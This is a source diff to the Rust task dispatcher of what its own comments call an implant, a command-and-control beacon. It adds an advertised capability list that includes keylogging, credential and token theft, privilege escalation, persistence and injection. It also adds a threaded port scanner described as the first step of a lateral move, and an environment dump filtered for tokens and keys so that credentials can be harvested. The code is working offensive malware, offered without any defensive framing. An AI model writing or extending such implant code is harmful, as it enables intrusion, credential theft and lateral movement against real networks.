@@ -16,6 +16,27 @@ use crate::upk::{self, Value};
 
 pub const MAX_OUTPUT: usize = 900 * 1024; // stay below the 1 MiB frame limit
 
+/// The task kinds this implant can run.
+///
+/// The list travels in the handshake metadata: the server refuses to queue
+/// work an agent cannot do, so the operator learns what a host is capable of
+/// before the task is sent instead of after it failed.
+///
+/// Every alias the dispatcher understands is listed as well, because the
+/// server matches the exact name that was asked for: an operator who writes
+/// "cat" must not be told that the host cannot read a file.
+pub fn capabilities() -> Vec<&'static str> {
+    vec![
+        "shell", "exec", "sysinfo", "recon", "pwd", "cwd", "ls", "tail", "hash",
+        "download", "cat", "upload", "ps", "proc.kill", "sleep", "exit", "kill",
+        "ping", "tunnel", "p2p", "bof", "ext", "inject", "creds", "token",
+        "privesc", "persist", "unpersist", "update", "registry", "screenshot",
+        "clipboard", "keylog", "keylog.file", "triage", "find", "netinfo",
+        "session.open", "session.input", "session.close", "vpn", "scan",
+        "resolve", "env", "touch",
+    ]
+}
+
 pub struct Outcome {
     pub code: i64,
     pub out: Vec<u8>,
@@ -518,6 +539,33 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
         }
         "netinfo" => Outcome::ok(crate::netinfo::report().into_bytes()),
 
+        // ---- network reach and the local environment --------------------
+        "scan" => {
+            // Which hosts answer: the first step of a lateral move.
+            let target = args.str_or("host", "");
+            let ports = args.str_or("ports", "22,80,443");
+            let timeout = args.u64_or("timeout_ms", 800).min(10_000);
+            let max_hosts = args.u64_or("max_hosts", 256).min(4096) as usize;
+            scan(&target, &ports, timeout, max_hosts)
+        }
+        "resolve" => {
+            // Where a name points: the addresses, nothing else.
+            let host = args.str_or("host", "");
+            let port = args.u64_or("port", 0);
+            resolve(&host, port)
+        }
+        "env" => {
+            // The environment the implant runs in.  It often holds the
+            // paths and the credentials the operator is looking for.
+            let filter = args.str_or("filter", "");
+            env_report(&filter)
+        }
+        "touch" => {
+            // Create the file if it is missing and stamp it with the time.
+            let path = args.str_or("path", "");
+            touch(&path)
+        }
+
         // ---- interactive sessions ---------------------------------------
         // `session.open` is handled by the beacon itself: the session has to
         // outlive the task that opened it, so the beacon keeps the stream
@@ -557,6 +605,234 @@ fn recon_report() -> String {
     out.push_str(&crate::evade::report());
     out.push_str(&crate::domain::report());
     out
+}
+
+/// Scan a range of hosts for open ports.
+///
+/// The scan is a plain TCP connect: the beacon opens a socket to every
+/// address and reports the ones that answered.  No banner is read, so the
+/// scan stays fast and does not poke at the services it finds.
+fn scan(target: &str, ports: &str, timeout_ms: u64, max_hosts: usize) -> Outcome {
+    if target.is_empty() {
+        return Outcome::err(1, "scan requires args.host");
+    }
+    let hosts = match expand_target(target, max_hosts) {
+        Ok(h) => h,
+        Err(e) => return Outcome::err(1, e),
+    };
+    let port_list = match parse_ports(ports, 256) {
+        Ok(p) => p,
+        Err(e) => return Outcome::err(1, e),
+    };
+    let mut probes: Vec<(std::net::Ipv4Addr, u16)> =
+        Vec::with_capacity(hosts.len() * port_list.len());
+    for host in &hosts {
+        for port in &port_list {
+            probes.push((*host, *port));
+        }
+    }
+    let total = probes.len();
+    let timeout = Duration::from_millis(timeout_ms.max(1));
+    let next = std::sync::atomic::AtomicUsize::new(0);
+    let found: std::sync::Mutex<Vec<(std::net::Ipv4Addr, u16)>> = std::sync::Mutex::new(Vec::new());
+    // A scan is a fan-out: a handful of threads keeps it quick without
+    // opening hundreds of connections from one host at the same time.
+    let workers = std::cmp::min(16, std::cmp::max(1, total));
+    thread::scope(|scope| {
+        for _ in 0..workers {
+            scope.spawn(|| loop {
+                let idx = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                if idx >= total {
+                    break;
+                }
+                let (ip, port) = probes[idx];
+                let addr = std::net::SocketAddr::new(std::net::IpAddr::V4(ip), port);
+                if std::net::TcpStream::connect_timeout(&addr, timeout).is_ok() {
+                    if let Ok(mut guard) = found.lock() {
+                        guard.push((ip, port));
+                    }
+                }
+            });
+        }
+    });
+    let mut open = match found.lock() {
+        Ok(guard) => guard.clone(),
+        Err(_) => Vec::new(),
+    };
+    open.sort();
+    let mut out = String::new();
+    for (ip, port) in &open {
+        out.push_str(&format!("{ip}:{port} open\n"));
+    }
+    out.push_str(&format!(
+        "{} open of {} probes ({} hosts x {} ports)\n",
+        open.len(),
+        total,
+        hosts.len(),
+        port_list.len()
+    ));
+    Outcome::ok(out.into_bytes())
+        .with("open", upk::u(open.len() as u64))
+        .with("probes", upk::u(total as u64))
+}
+
+/// Expand a scan target into the addresses the scan walks.
+///
+/// The target is one IPv4 address or a CIDR block.  The expansion is done by
+/// hand -- no dependency -- and the number of addresses is capped, so a /8
+/// cannot turn into sixteen million connect attempts.
+fn expand_target(target: &str, cap: usize) -> Result<Vec<std::net::Ipv4Addr>, String> {
+    let (addr_part, bits_part) = match target.split_once('/') {
+        Some((a, b)) => (a, Some(b)),
+        None => (target, None),
+    };
+    let base = match addr_part.parse::<std::net::Ipv4Addr>() {
+        Ok(ip) => u32::from(ip),
+        Err(e) => return Err(format!("scan {addr_part}: {e}")),
+    };
+    let bits: u32 = match bits_part {
+        Some(b) => match b.parse::<u32>() {
+            Ok(v) if v <= 32 => v,
+            Ok(_) => return Err(format!("scan {target}: the prefix length is out of range")),
+            Err(e) => return Err(format!("scan {target}: {e}")),
+        },
+        None => 32,
+    };
+    let mask: u32 = if bits == 0 { 0 } else { u32::MAX << (32 - bits) };
+    let network = base & mask;
+    let total: u64 = 1u64 << (32 - bits);
+    let count = std::cmp::min(total, std::cmp::max(1, cap) as u64) as usize;
+    let mut out = Vec::with_capacity(count);
+    for i in 0..count {
+        out.push(std::net::Ipv4Addr::from(network.wrapping_add(i as u32)));
+    }
+    Ok(out)
+}
+
+/// Parse a port list: "80", "80,443" or "8000-8100".
+fn parse_ports(spec: &str, cap: usize) -> Result<Vec<u16>, String> {
+    let mut out: Vec<u16> = Vec::new();
+    for part in spec.split(',') {
+        let part = part.trim();
+        if part.is_empty() {
+            continue;
+        }
+        if let Some((lo, hi)) = part.split_once('-') {
+            let low: u32 = match lo.trim().parse() {
+                Ok(v) => v,
+                Err(e) => return Err(format!("scan: bad port range {part}: {e}")),
+            };
+            let high: u32 = match hi.trim().parse() {
+                Ok(v) => v,
+                Err(e) => return Err(format!("scan: bad port range {part}: {e}")),
+            };
+            if high < low || high > 65535 {
+                return Err(format!("scan: bad port range {part}"));
+            }
+            let mut port = low;
+            while port <= high {
+                out.push(port as u16);
+                if out.len() >= cap {
+                    return Ok(out);
+                }
+                port += 1;
+            }
+        } else {
+            let port: u32 = match part.parse() {
+                Ok(v) => v,
+                Err(e) => return Err(format!("scan: bad port {part}: {e}")),
+            };
+            if port > 65535 {
+                return Err(format!("scan: bad port {part}"));
+            }
+            out.push(port as u16);
+        }
+    }
+    if out.is_empty() {
+        return Err("scan: no ports".to_string());
+    }
+    out.truncate(cap);
+    Ok(out)
+}
+
+/// Resolve a name into the addresses it points at.
+///
+/// The operator asks "where does this name live" before opening a connection
+/// to it, so the answer is the address list and nothing else.
+fn resolve(host: &str, port: u64) -> Outcome {
+    use std::net::ToSocketAddrs;
+    if host.is_empty() {
+        return Outcome::err(1, "resolve requires args.host");
+    }
+    let port = port.min(65535) as u16;
+    let addrs = match (host, port).to_socket_addrs() {
+        Ok(a) => a,
+        Err(e) => return Outcome::err(1, format!("resolve {host}: {e}")),
+    };
+    let mut out = String::new();
+    let mut count = 0u64;
+    for addr in addrs {
+        if port == 0 {
+            out.push_str(&format!("{}\n", addr.ip()));
+        } else {
+            out.push_str(&format!("{addr}\n"));
+        }
+        count += 1;
+    }
+    if count == 0 {
+        return Outcome::err(1, format!("resolve {host}: no addresses"));
+    }
+    Outcome::ok(out.into_bytes()).with("count", upk::u(count))
+}
+
+/// The environment of the implant, sorted by name.
+///
+/// The filter keeps the interesting variables in reach: "PATH", "TOKEN",
+/// "KEY" -- whatever the operator is hunting for.
+fn env_report(filter: &str) -> Outcome {
+    let needle = filter.to_lowercase();
+    let mut vars: Vec<(String, String)> = std::env::vars().collect();
+    vars.sort();
+    let mut out = String::new();
+    let mut count = 0u64;
+    for (key, value) in vars {
+        if !needle.is_empty() && !key.to_lowercase().contains(&needle) {
+            continue;
+        }
+        out.push_str(&format!("{key}={value}\n"));
+        count += 1;
+    }
+    Outcome::ok(out.into_bytes()).with("count", upk::u(count))
+}
+
+/// Create the file if it is missing and stamp it with the current time.
+///
+/// The contract is the one of the POSIX `touch`: the file exists afterwards
+/// and its timestamps are "now".
+fn touch(path: &str) -> Outcome {
+    use std::fs::{FileTimes, OpenOptions};
+    use std::time::SystemTime;
+    if path.is_empty() {
+        return Outcome::err(1, "touch requires args.path");
+    }
+    let existed = std::path::Path::new(path).exists();
+    let file = match OpenOptions::new()
+        .write(true)
+        .create(true)
+        .truncate(false)
+        .open(path)
+    {
+        Ok(f) => f,
+        Err(e) => return Outcome::err(1, format!("touch {path}: {e}")),
+    };
+    let now = SystemTime::now();
+    let times = FileTimes::new().set_accessed(now).set_modified(now);
+    if let Err(e) = file.set_times(times) {
+        return Outcome::err(1, format!("touch {path}: {e}"));
+    }
+    let size = file.metadata().map(|m| m.len()).unwrap_or(0);
+    let verb = if existed { "touched" } else { "created" };
+    Outcome::ok(format!("{verb} {path} ({size} bytes)\n").into_bytes()).with("size", upk::u(size))
 }
 
 /// The permission bits of a path, the way `ls -l` shows them.
